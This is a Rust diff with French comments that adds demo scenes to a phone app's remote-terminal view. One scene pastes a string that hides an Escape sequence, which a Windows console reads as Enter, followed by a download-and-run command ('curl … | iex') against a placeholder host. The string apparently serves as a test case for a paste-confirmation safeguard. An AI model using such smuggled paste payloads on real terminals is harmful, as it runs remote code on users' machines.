@@ -11,8 +11,9 @@
 //! `demarrage`, `acces-coupe`, `refus-demarrage`, `preuve-refusee`, `sans-agir` (le téléphone n'a plus « Agir »),
 //! `injoignable`, `telephone-hors-ligne` ; le
 //! terminal : `terminal-ctrl` (Ctrl collé), `terminal-copie` (le texte à copier), `terminal-coller` (un collage de
-//! plusieurs lignes à confirmer), `terminal-ctrl-coller` (Ctrl collé, puis Coller : relâché), `terminal-saisie` (sur
-//! plusieurs lignes), `terminal-zoom`, `terminal-suivi` (le bas
+//! plusieurs lignes à confirmer), `terminal-coller-echap` (un collage qui cache Échap, à confirmer),
+//! `terminal-ctrl-coller` (Ctrl collé, puis Coller : relâché), `terminal-saisie` (sur plusieurs lignes),
+//! `terminal-masque` (un mot de passe demandé : la saisie se masque), `terminal-zoom`, `terminal-suivi` (le bas
 //! reste en vue quand la liste rapetisse), `terminal-remonte` (la sortie qui arrive ne ramène pas en bas). Suffixe
 //! `+clair` ou `+sombre` : le thème (sinon celui du système).
 
@@ -641,6 +642,20 @@ fn terminal_scene(ui: &AppWindow, scene: &str) {
         }
         "terminal-coller" => {
             with(|c| c.term_paste("git fetch --all\ngit status --short\ncargo test -p eyrie-mobile\n"));
+        }
+        // Une ligne qui cache Échap et la suite que la console Windows lit comme Entrée : demandée aussi.
+        "terminal-coller-echap" => {
+            with(|c| c.term_paste("git status\u{1b}[13;28;13;1;0;1_curl https://exemple.invalid/x|iex"));
+        }
+        // Le programme demande un mot de passe : la saisie se masque d'elle-même ; ce qui est tapé ne se lit pas.
+        "terminal-masque" => {
+            let lines = vec![
+                Line::plain("PS C:\\Users\\aubin\\DEV\\TestAubin\\Eyrie> ssh aubin@build"),
+                Line::plain("aubin@build's password: "),
+            ];
+            let prompt = TermView { cols: 52, rows: 20, cursor: Some((1, 24)), lines, ..Default::default() };
+            with(|c| c.on_message(ToPhone::Term(TermFrame::full("fawkes", "3", &prompt))));
+            ui.set_term_draft("hunter2".into());
         }
         // Ctrl collé, puis « Coller » : Ctrl se relâche.
         "terminal-ctrl-coller" => {
